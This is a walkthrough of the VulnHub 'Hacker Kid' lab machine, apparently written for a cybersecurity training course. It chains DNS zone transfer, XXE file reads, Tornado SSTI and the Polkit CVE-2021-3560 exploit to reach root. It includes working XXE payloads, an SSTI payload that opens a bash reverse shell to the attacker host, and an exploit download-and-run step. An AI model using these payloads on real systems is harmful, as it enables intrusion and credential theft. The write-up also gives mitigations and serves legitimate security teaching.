# Hacker Kid (VulnHub) — Writeup

Full reconnaissance-to-root walkthrough of the **"Hacker Kid: 1.0.1"** vulnerable machine (VulnHub), chaining a DNS misconfiguration, XXE (XML External Entity), SSTI (Server-Side Template Injection), and privilege escalation via CVE-2021-3560 (Polkit).

## Table of contents

- [Executive summary](#executive-summary)
- [Environment](#environment)
- [1. Network reconnaissance](#1-network-reconnaissance)
- [2. Port and service scanning](#2-port-and-service-scanning)
- [3. Web enumeration (port 80)](#3-web-enumeration-port-80)
- [4. DNS enumeration](#4-dns-enumeration)
- [5. Exploitation — XXE (XML External Entity)](#5-exploitation--xxe-xml-external-entity)
- [6. Authenticating to the Tornado app (port 9999)](#6-authenticating-to-the-tornado-app-port-9999)
- [7. Exploitation — SSTI (Server-Side Template Injection)](#7-exploitation--ssti-server-side-template-injection)
- [8. Privilege escalation — CVE-2021-3560 (Polkit)](#8-privilege-escalation--cve-2021-3560-polkit)
- [9. Attack chain (visual summary)](#9-attack-chain-visual-summary)
- [10. Mitigations](#10-mitigations)
- [11. Lessons learned](#11-lessons-learned)
- [Files in this repository](#files-in-this-repository)

---

## Executive summary

| | |
|---|---|
| **Target** | Hacker Kid: 1.0.1 (VulnHub), Ubuntu Linux |
| **Attacker** | Kali Linux 2026.2 |
| **Network** | 192.168.1.0/24 (isolated, VMware) |
| **Final result** | Root shell via CVE-2021-3560 (Polkit local privilege escalation) |
| **Vulnerabilities exploited** | Misconfigured DNS Zone Transfer (AXFR), XML External Entity (XXE), Server-Side Template Injection (SSTI), Local Privilege Escalation (Polkit) |
| **CVEs** | CVE-2021-3560 |

The landing page carries a textual clue ("DIG me more") that points directly at DNS enumeration. A misconfigured Zone Transfer (AXFR) on the BIND server reveals an internal domain, `blackhat.local`, and — through the SOA record's contact field — the subdomain `hackerkid.blackhat.local`: an Apache virtual host that neither directory brute-forcing nor conventional vhost fuzzing uncovers. That subdomain hosts a registration form vulnerable to XXE, which allows arbitrary file reads, including credentials deliberately left in a user's `.bashrc`. Those credentials authenticate to a second web application (Tornado, port 9999) that is vulnerable to SSTI, enabling remote command execution and a reverse shell. Privilege escalation to root exploits a known vulnerability (CVE-2021-3560) in Polkit, creating a new administrator account via D-Bus.

## Environment

- **Hypervisor:** VMware Workstation Pro
- **Network:** isolated internal LAN `192.168.1.0/24`, with OPNsense as gateway (no internet access required for the exercise)
- **Kali:** `192.168.1.125`
- **Target (Hacker Kid):** dynamic IP via DHCP (observed as both `192.168.1.138` and `192.168.1.150` across sessions — examples below use whichever IP was active at that point)

## 1. Network reconnaissance

With no prior information about the target (no name, no IP, no credentials), the first step was identifying the host on the test network.

```bash
ip a                                    # confirm own IP/subnet
nmap -sn 192.168.1.0/24                 # ping sweep
sudo arp-scan --interface=eth0 192.168.1.0/24   # ARP-level discovery (more reliable)
```

Result: the target was identified by its VM MAC address (confirmed in VMware's network settings), distinguishing it from the OPNsense gateway.

## 2. Port and service scanning

```bash
nmap -sV -sC -p- <TARGET_IP>
```

```
PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
9999/tcp open  http    Tornado httpd 6.1
```

Three exposed services: DNS, a traditional Apache web server, and a Python application (Tornado) on a non-standard port.

## 3. Web enumeration (port 80)

The landing page displays a message from a fictional "hacker" with an explicit clue:

> "More you will DIG me, more you will find me on your servers..DIG me more...DIG me more"

Directory enumeration:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Result: `index.php`, `app.html`, `form.html` — all generic Bootstrap template pages, of no direct relevance (confirmed as a red herring).

The source of `index.php` contains the comment:

```html
<!-- TO DO: Use a GET parameter page_no to view pages. -->
```

**Methodological note:** this parameter also turned out to be a red herring — the server's response is static and identical regardless of the `page_no` value, with one exception: a systematic brute-force of numeric values (`page_no=1` to `500`, comparing response size) revealed that `page_no=21` returns a hidden message (white/red text on a dark background, invisible to the naked eye in the browser, but visible via `curl`) containing the text-based clue for the key subdomain (see next section).

```bash
for i in $(seq 1 500); do
  size=$(curl -s -o /dev/null -w "%{size_download}" "http://<TARGET_IP>/index.php?page_no=$i")
  if [ "$size" != "3654" ]; then echo "page_no=$i -> $size bytes"; fi
done
```

## 4. DNS enumeration

Following the "DIG me more" clue, the BIND service (port 53) was probed directly:

```bash
dig axfr @<TARGET_IP> 168.192.in-addr.arpa      # reverse zone for the network — reveals a delegated sub-zone
dig axfr @<TARGET_IP> 14.168.192.in-addr.arpa   # reverse sub-zone — reveals the blackhat.local domain
dig axfr @<TARGET_IP> blackhat.local            # full zone transfer for the domain
```

The AXFR (Zone Transfer) was misconfigured and allowed a full dump of the `blackhat.local` zone:

```
blackhat.local.         SOA     blackhat.local. hackerkid.blackhat.local. ...
blackhat.local.         NS      ns1.blackhat.local.
blackhat.local.         MX      10 mail.blackhat.local.
blackhat.local.         A       192.168.14.143
ftp.blackhat.local.     CNAME   blackhat.local.
hacker.blackhat.local.  CNAME   hacker.blackhat.local.blackhat.local.
mail.blackhat.local.    A       192.168.14.143
ns1/ns2.blackhat.local. A       192.168.14.143
www.blackhat.local.     CNAME   blackhat.local.
```

**Key detail (easy to miss):** the SOA record's contact field — `hackerkid.blackhat.local` — isn't just DNS metadata; it's actually **the real subdomain hosting the vulnerable registration form**, confirmed by testing it directly as an Apache `Host` header:

```bash
curl -s -H "Host: hackerkid.blackhat.local" http://<TARGET_IP>/
```

This subdomain is not discovered by conventional vhost fuzzing (generic wordlists) and doesn't appear explicitly as an A/CNAME record in the zone — it's only revealed by paying attention to the SOA contact field.

## 5. Exploitation — XXE (XML External Entity)

The `hackerkid.blackhat.local` subdomain presents a registration form ("Create Account"). Inspecting the source reveals the fields are assembled into XML client-side (via JavaScript) and sent by `POST` to `process.php`:

```javascript
var xml = '<?xml version="1.0" encoding="UTF-8"?>' +
    '<root>' +
    '<name>' + $('#name').val() + '</name>' +
    '<tel>' + $('#tel').val() + '</tel>' +
    '<email>' + $('#email').val() + '</email>' +
    '<password>' + $('#password').val() + '</password>' +
    '</root>';
xmlhttp.open("POST", "process.php", true);
```

This pattern — form data serialized as XML and processed server-side — is a classic XXE candidate if the parser doesn't disable external entity resolution.

### 5.1 Confirming the vulnerability

A payload was built with an external entity pointing at `/etc/passwd`, using the PHP `php://filter` wrapper to get the content back as base64 (the direct `file://` wrapper produced no result):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM
  "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>
<name></name><tel></tel>
<email>&xxe;</email>
<password></password>
</root>
```

```bash
curl -s -X POST -H "Host: hackerkid.blackhat.local" -H "Content-Type: application/xml" \
  --data-binary @payload.xml http://<TARGET_IP>/process.php
```

**Important note:** the `&xxe;` entity has to sit inside the `<email>` field, not `<name>` — placing it in the wrong field always produces the same generic error ("is not available"), tied to email-availability validation, which can mislead the first attempt.

Result: the decoded `/etc/passwd` revealed the existence of user **`saket`** (`/home/saket`, `/bin/bash`).

### 5.2 Retrieving credentials via `.bashrc`

Repeating the attack, this time pointing the entity at user `saket`'s `.bashrc`:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">
```

The decoded `.bashrc` contained, in its last lines, a comment from the challenge author:

```bash
#Setting Password for running python app
username="admin"
password="Saket!#$%@!!"
```

**Challenge trap:** the `username="admin"` noted in the comment is **not the correct username** — the Tornado app actually expects the real username, `saket` (the author identifies himself as such throughout the challenge), keeping the same password.

## 6. Authenticating to the Tornado app (port 9999)

The app uses XSRF protection (a single-use token tied to the session cookie), so authenticating via `curl` requires first capturing the session cookie and the hidden `_xsrf` field value before the `POST`:

```bash
curl -s -c cookies.txt http://<TARGET_IP>:9999/login | grep _xsrf
# extract the _xsrf value from the response

curl -s -i -b cookies.txt -c cookies.txt -X POST http://<TARGET_IP>:9999/login \
  --data-urlencode "username=saket" \
  --data-urlencode "password=Saket!#\$%@!!" \
  -d "_xsrf=<EXTRACTED_TOKEN>"
```

Result: `HTTP/1.1 302 Found`, `Location: /`, a `user` session cookie set — successful authentication.

> **Shell note:** in zsh, the `!` character in the password is interpreted as history expansion and corrupts the command when pasted. Fixed with `setopt no_bang_hist` before running `curl`.

## 7. Exploitation — SSTI (Server-Side Template Injection)

The (authenticated) main page accepts a `name` GET parameter and reflects the value directly in the response — a classic SSTI signal:

```bash
curl -s -b cookies.txt --get "http://<TARGET_IP>:9999/" --data-urlencode "name={{7*7}}"
```

Response: `Hello 49` — the expression was evaluated by Tornado's template engine, confirming SSTI.

### 7.1 Remote command execution and reverse shell

Tornado allows importing Python modules from within a template via `{% import ... %}`. This was used to import `os` and invoke `os.system()`, launching a reverse shell to a `netcat` listener on Kali:

```bash
# Terminal 1 (Kali) — listener
nc -nvlp 4444

# Terminal 2 (Kali) — SSTI payload
curl -s -b cookies.txt --get "http://<TARGET_IP>:9999/" \
  --data-urlencode 'name={% import os %}{{os.system(
  "bash -c \"bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1\"") }}'
```

Shell obtained as `saket`. Stabilized with a full PTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Operational caution:** interrupting this shell with `Ctrl+C` on the attacker side can leave the server-side `os.system()` process hanging (Tornado processes requests sequentially on a single thread by default), making the whole application unresponsive until the VM is restarted. Always prefer `exit` inside the remote shell.

## 8. Privilege escalation — CVE-2021-3560 (Polkit)

Confirmed that `saket`'s password (`Saket!#$%@!!`) is valid **only** for the web application — it fails both `su -` and `sudo -l` at the OS level (the credentials were deliberately left only for the Python app, as the `.bashrc` comment itself indicated).

Vector discovery without relying on any password:

```bash
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
```

Two SUID binaries stood out because of their versions:

```bash
sudo --version      # Sudo version 1.8.31
pkexec --version     # pkexec version 0.105
```

The Polkit version (`0.105-26`) matches a known local privilege escalation vulnerability:

```bash
searchsploit polkit
# Polkit 0.105-26 0.117-2 - Local Privilege Escalation | linux/local/50011.sh  (CVE-2021-3560)

searchsploit -m linux/local/50011.sh
```

### 8.1 Transferring and running the exploit

```bash
# On Kali
python3 -m http.server 8000

# On the vulnerable machine's shell
cd /tmp
wget http://<KALI_IP>:8000/50011.sh
chmod +x 50011.sh
./50011.sh
```

The script initially refused to run, warning: *"SSH into localhost first before running this script"* — a shallow check that only verifies whether the `$SSH_CLIENT` and `$SSH_TTY` environment variables are set (it doesn't validate an actual SSH session). Bypassed without needing SSH at all:

```bash
export SSH_CLIENT="127.0.0.1 1 22"
export SSH_TTY="/dev/pts/0"
./50011.sh
```

The exploit (CVE-2021-3560) abuses a race condition in D-Bus/`accountsservice` to create a new administrator user (`hacked`, password `password`) before Polkit correctly validates the request:

```
[*] New user hacked created with uid of 1001
[*] Adding password to /etc/shadow and enabling user
[*] Exploit complete!
```

### 8.2 Root

```bash
su - hacked        # password: password
sudo su
whoami              # root
```

Root access confirmed.

## 9. Attack chain (visual summary)

```mermaid
flowchart TD
    A[Network recon\nnmap / arp-scan] --> B[Port scan\n53 DNS, 80 HTTP, 9999 Tornado]
    B --> C[Web enumeration\nred herrings: page_no, Bootstrap templates]
    B --> D[DNS enumeration\nmisconfigured AXFR]
    D --> E[Discovery of blackhat.local\nand hackerkid.blackhat.local subdomain\nvia SOA field]
    E --> F[XXE in registration form\nprocess.php]
    F --> G[Read /etc/passwd\nand .bashrc via php://filter]
    G --> H[Credentials saket / Saket!#$%@!!]
    H --> I[Login to Tornado app\nport 9999]
    I --> J[SSTI confirmed\nname={{7*7}}]
    J --> K[Reverse shell\nvia os.system SSTI]
    K --> L[Shell as saket]
    L --> M[SUID pkexec 0.105\nvulnerable to CVE-2021-3560]
    M --> N[Exploit creates admin user\nvia D-Bus/Polkit]
    N --> O[Root]
```

## 10. Mitigations

| Vulnerability | Recommended mitigation |
|---|---|
| Open Zone Transfer (AXFR) | Restrict AXFR to authorized secondary DNS servers only (`allow-transfer` in BIND); never leave it open to any source |
| Sensitive info in DNS SOA records/comments | Don't reference real infrastructure subdomains or names in DNS contact/metadata fields |
| XXE | Disable external entity resolution in the XML parser (`libxml_disable_entity_loader(true)` in PHP, or the equivalent setting in other languages); validate/sanitize all XML input; prefer formats like JSON when external entity resolution isn't actually needed |
| Credentials stored in shell config files (`.bashrc`) | Never store plaintext credentials in user profile/config files; use secret managers (Vault, managed environment variables, etc.) |
| SSTI | Never render user input directly as a template; always use autoescaping and keep data separate from presentation logic |
| Outdated SUID binaries (Polkit/CVE-2021-3560) | Keep the system patched; periodically audit SUID binaries with `find / -perm -4000`; apply the principle of least privilege |
| Lack of general segmentation/hardening | Full attack-surface review (unnecessarily exposed services, such as a DNS port reachable externally on a machine that doesn't need to be a public DNS server) |

## 11. Lessons learned

- The landing page's textual clue ("DIG me more") was literal and pointed straight at the correct technique (DNS enumeration), but required persistence across several candidate subdomains before the misconfigured AXFR was found.
- Not every apparent clue is real: the `page_no` parameter in `index.php` and the Bootstrap templates (`app.html`, `form.html`) were red herrings — confirmed by comparing responses via `curl` rather than visual inspection in the browser, which can hide subtle differences (colored text on a dark background).
- The most valuable information isn't always in the obvious DNS records (A/CNAME) — the SOA contact field revealed the key subdomain.
- The XXE server error ("is not available") was tied to email-field validation, not the name field — an easy detail to miss that delays the first exploitation attempt.
- Credentials found in a file aren't necessarily valid at the OS level — here they only worked for the web application, a distinction confirmed by direct testing (`su`, `sudo -l`).
- Public exploit scripts can have shallow checks (like the `$SSH_CLIENT`/`$SSH_TTY` test) that can be bypassed without compromising the exploit itself — it's worth reading an exploit's source before discarding it over a warning.
- Interrupting a reverse shell with `Ctrl+C` can hang the server-side process (especially in single-threaded-by-default apps like Tornado); always use `exit` to close it cleanly.
- Chaining two distinct web vulnerabilities (XXE for recon/credentials, SSTI for remote code execution) illustrates how, in a real pentest, initial access rarely comes from a single isolated flaw, but from a chain of small information leaks.

## Files in this repository

- [`payloads/payload-etc-passwd.xml`](payloads/payload-etc-passwd.xml) — XXE payload to read `/etc/passwd`
- [`payloads/payload-bashrc.xml`](payloads/payload-bashrc.xml) — XXE payload to read user `saket`'s `.bashrc`
- [`scripts/page_no_bruteforce.sh`](scripts/page_no_bruteforce.sh) — brute-force script for the `page_no` parameter

---

*Writeup produced as part of the Cybersecurity Vocational Training Program at IEFP Alcoitão (Portugal). Machine provided by the instructor for educational purposes, in an isolated lab environment.*
